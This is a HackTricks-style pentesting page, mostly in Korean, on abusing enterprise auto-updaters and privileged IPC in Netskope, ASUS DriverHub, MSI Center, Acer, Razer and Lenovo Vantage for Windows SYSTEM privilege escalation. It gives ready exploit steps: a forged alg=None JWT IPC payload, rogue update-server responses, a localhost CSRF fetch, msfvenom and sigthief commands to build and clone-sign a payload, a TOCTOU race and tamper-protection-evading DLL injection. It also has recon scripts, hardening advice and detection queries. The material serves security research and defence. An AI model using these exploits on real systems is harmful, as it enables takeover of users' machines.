# Enterprise Auto-Updaters 및 Privileged IPC 악용하기 (예: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 enterprise endpoint agents와 updaters에서 발견되는 Windows local privilege escalation 체계를 일반화한 것이다. 이들은 low-friction IPC surface와 privileged update flow를 노출한다. 대표적인 예는 Windows < R129의 Netskope Client (CVE-2025-0309)로, low-privileged user가 attacker-controlled server로 enrollment를 강제한 뒤 SYSTEM service가 설치하는 malicious MSI를 전달할 수 있다.

다음 핵심 아이디어는 유사한 제품에도 재사용할 수 있다:
- privileged service의 localhost IPC를 악용해 attacker server로의 re-enrollment 또는 reconfiguration을 강제한다.
- vendor의 update endpoints를 구현하고, rogue Trusted Root CA를 전달한 뒤 updater가 malicious, “signed” package를 향하도록 한다.
- weak signer checks (CN allow-lists), optional digest flags, lax MSI properties를 우회한다.
- IPC가 “encrypted”라면, registry에 저장된 world-readable machine identifiers에서 key/IV를 derive한다.
- 서비스가 caller를 image path/process name으로 제한한다면, allow-listed process에 inject하거나 suspended 상태로 하나를 spawn한 뒤 minimal thread-context patch로 DLL을 bootstrap한다.

---
## 1) localhost IPC를 통해 attacker server로 enrollment 강제하기

많은 agents는 localhost TCP를 통해 JSON으로 SYSTEM service와 통신하는 user-mode UI process를 함께 제공한다.

Netskope에서 관찰된 것:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host (예: AddonUrl)를 제어하는 claims를 가진 JWT enrollment token을 만든다. alg=None을 사용해 signature가 필요 없도록 한다.
2) 당신의 JWT와 tenant name을 사용해 provisioning command를 호출하는 IPC message를 보낸다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 enrollment/config를 위해 rogue server로 요청을 보내기 시작함, 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- caller verification이 path/name-based라면, allow-listed vendor binary에서 요청을 시작하라(see §4).

---
## 2) update channel을 hijacking하여 code를 SYSTEM으로 실행하기

client가 your server와 통신하기 시작하면, expected endpoints를 구현하고 attacker MSI로 유도한다. 일반적인 sequence:

1) /v2/config/org/clientconfig → 아주 짧은 updater interval을 가진 JSON config를 반환, 예:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 version을 가리키는 metadata를 제공합니다.

실제 현장에서 흔히 보이는 체크 우회:
- Signer CN allow-list: 서비스가 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 같은지만 확인할 수 있습니다. 당신의 rogue CA는 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 이름의 무해한 MSI property를 포함합니다. 설치 시 enforcement는 없습니다.
- Optional digest enforcement: config flag(예: check_msi_digest=false)가 추가 cryptographic validation을 비활성화합니다.

결과: SYSTEM service가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치하고 NT AUTHORITY\SYSTEM으로 arbitrary code를 실행합니다.

Patch-bypass lesson: vendor가 update source를 cryptographically authenticate하지 않고, 대신 소수의 “trusted” domains만 allow-listing하는 식으로 대응한다면, 여전히 트래픽을 조종할 수 있는 vendor-owned redirectors나 reverse proxies를 찾아보라. Netskope의 경우, 이후 공개된 follow-up research는 R129-era allow-list가 `rproxy.goskope.com`을 통해 여전히 abuse될 수 있었고, 이 호스트는 attacker-controlled Azure App Service content를 proxy하고 있었다고 보여주었다. hostname allow-lists는 trust boundary가 아니라 단지 speed bump로 취급하라.

---
## 3) 암호화된 IPC requests 위조하기 (존재하는 경우)

R127부터 Netskope는 IPC JSON을 encryptData 필드로 감쌌고, 겉보기에는 Base64처럼 보였습니다. reversing 결과 AES를 사용하며 key/IV는 아무 사용자나 읽을 수 있는 registry value에서 파생되었습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers는 암호화를 재현하고 standard user로부터 유효한 encrypted command를 보낼 수 있습니다. 일반 팁: agent가 갑자기 IPC를 “encrypt”하기 시작하면, HKLM 아래의 device ID, product GUID, install ID를 material로 찾아보라.

---
## 4) IPC caller allow-list 우회하기 (path/name checks)

일부 서비스는 TCP connection의 PID를 확인한 뒤, allow-listed vendor binaries의 image path/name과 비교해 peer를 인증하려고 합니다. 이 바이너리들은 보통 Program Files 아래에 있습니다(예: stagentui.exe, bwansvc.exe, epdlp.exe).

두 가지 실용적인 bypass:
- allow-listed process로 DLL injection을 수행한 뒤(예: nsdiag.exe), 그 안에서 IPC를 proxy합니다.
- CreateRemoteThread 없이 suspended 상태로 allow-listed binary를 띄우고 proxy DLL을 bootstrap하여 driver-enforced tamper rules를 만족시킵니다(§5 참조).

---
## 5) Tamper-protection 친화적 injection: suspended process + NtContinue patch

제품은 protected process에 대한 handle에서 위험한 권한을 제거하기 위해 종종 minifilter/OB callbacks driver(예: Stadrv)를 포함합니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한

이 제약을 존중하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED로 vendor binary의 CreateProcess를 수행합니다.
2) 여전히 허용되는 handle을 얻습니다: process에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, thread에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에서 code를 patch한다면 THREAD_RESUME만).
3) ntdll!NtContinue(또는 다른 early, guaranteed-mapped thunk)를 아주 작은 stub으로 덮어씁니다. 이 stub은 DLL path에 대해 LoadLibraryW를 호출한 뒤 다시 돌아갑니다.
4) ResumeThread로 in-process에서 stub을 트리거하여 DLL을 로드합니다.

이미 보호된 process에 대해 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME를 사용하지 않았고(프로세스는 직접 생성했으므로), driver의 policy를 만족합니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin)은 rogue CA, 악성 MSI 서명, 그리고 필요한 endpoints인 /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate를 serving하는 작업을 자동화합니다.
- UpSkope는 임의의(옵션으로 AES-encrypted된) IPC messages를 생성하고, allow-listed binary에서 originate되도록 suspended-process injection을 포함하는 custom IPC client입니다.

## 7) 알 수 없는 updater/IPC surfaces를 위한 빠른 triage workflow

새로운 endpoint agent나 motherboard “helper” suite를 마주했을 때, 다음 빠른 workflow만으로도 이것이 유망한 privesc target인지 대체로 판별할 수 있습니다:

1) loopback listeners를 열거하고 vendor processes로 다시 매핑합니다:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 후보 named pipe를 열거하기:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers가 사용하는 registry-backed routing data를 mine하기:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 먼저 user-mode client에서 endpoint 이름, JSON 키, command ID를 추출한다. Packed Electron/.NET frontends는 자주 전체 schema를 leak한다:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 실제 trust predicate를 찾아라, 결국 프로세스를 실행하는 코드 경로만 찾지 말고:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: helper suite가 먼저 **caller process**를 인증한 다음에만 수십 개의 plugin/add-in commands로 디스패치하는 broker를 노출한다면, front-door trust check를 우회한 뒤에 멈추지 마라. manifest/contract table을 덤프하고 각 high-privilege verb를 독립적으로 fuzz하라; authenticated channel은 보통 여러 second-stage bugs를 숨기고 있다.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 user-mode HTTP service (ADU.exe)를 제공하며, https://driverhub.asus.com에서 오는 browser calls를 기대한다. origin filter는 단순히 Origin header와 `/asus/v1.0/*`에서 노출되는 download URLs에 대해 `string_contains(".asus.com")`를 수행한다. 따라서 `https://driverhub.asus.com.attacker.tld` 같은 attacker-controlled host도 check를 통과하며 JavaScript에서 state-changing requests를 보낼 수 있다. 추가 bypass patterns는 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참고하라.

Practical flow:
1) `.asus.com`을 포함하는 domain을 등록하고 그곳에 malicious webpage를 host한다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 privileged endpoint(예: `Reboot`, `UpdateApp`)를 호출한다.
3) handler가 기대하는 JSON body를 전송한다 – packed frontend JS가 아래 schema를 보여준다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
아래에 표시된 PowerShell CLI도 Origin 헤더가 신뢰된 값으로 스푸핑되면 성공합니다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## 약한 updater 검증을 통한 원격 supply-chain hijack (WinGUp / Notepad++)

2025년 6월부터 2025년 12월 사이, Notepad++ update 흐름 뒤의 hosting infrastructure를 장악한 공격자들은 선택한 피해자들에게만 악성 manifest를 제공했다. 오래된 WinGUp 기반 updaters는 update authenticity를 완전히 검증하지 않았기 때문에, hostile XML response가 클라이언트를 attacker-controlled URLs로 리디렉션할 수 있었다. 클라이언트가 HTTPS content를 받아들이면서도 trusted certificate chain과 다운로드된 installer의 유효한 PE signature를 모두 강제하지 않았기 때문에, 피해자들은 trojanized NSIS `update.exe`를 내려받아 실행했다.

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting을 compromise하고 update check에 attacker metadata로 응답하여 malicious download URL을 가리키게 한다.
2. **Trojanized NSIS**: installer가 payload를 fetch/execute하고 두 개의 execution chain을 악용한다:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe`를 함께 포함하고, 그 search path에 malicious `log.dll`을 떨어뜨린다. signed binary가 실행되면 Windows가 `log.dll`을 sideload하며, 이 DLL은 Chrysalis backdoor를 decrypt하고 reflectively load한다 (static detection을 방해하기 위해 Warbird-protected + API hashing).
- **Scripted shellcode injection**: NSIS가 compiled Lua script를 실행하여 Win32 APIs (예: `EnumWindowStationsW`)를 사용해 shellcode를 inject하고 Cobalt Strike Beacon을 stage한다.

모든 auto-updater에 대한 hardening/detection takeaway:
- 다운로드된 installer의 **certificate + signature verification**을 강제한다(vendor signer pin, mismatched CN/chain 거부) 그리고 update manifest 자체도 서명한다(예: XMLDSig). 검증되지 않은 manifest-controlled redirects는 차단한다.
- **BYO signed binary sideloading**을 download 이후 detection pivot으로 취급한다: signed vendor EXE가 canonical install path 외부의 DLL 이름을 load할 때(예: Bitdefender가 `log.dll`을 Temp/Downloads에서 로드) 경보를 울리고, updater가 non-vendor signatures를 가진 installer를 temp에 drop/execute할 때도 탐지한다.
- 이 chain에서 관찰된 **malware-specific artifacts**를 모니터링한다(일반적인 pivot으로 유용): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` writes, 그리고 Lua-driven shellcode injection stages.
- Notepad++는 v8.8.9 이후 WinGUp을 강화했다: 반환되는 XML이 이제 signed(XMLDSig)이며, 최신 빌드는 transport만 신뢰하는 대신 다운로드된 installer에 대해 certificate + signature verification을 강제한다.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

이러한 패턴은 unsigned manifests를 허용하거나 installer signers를 pin하지 않는 모든 updater에 일반화된다—network hijack + malicious installer + BYO-signed sideloading은 “trusted” updates라는 명목 아래 remote code execution을 가능하게 한다.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
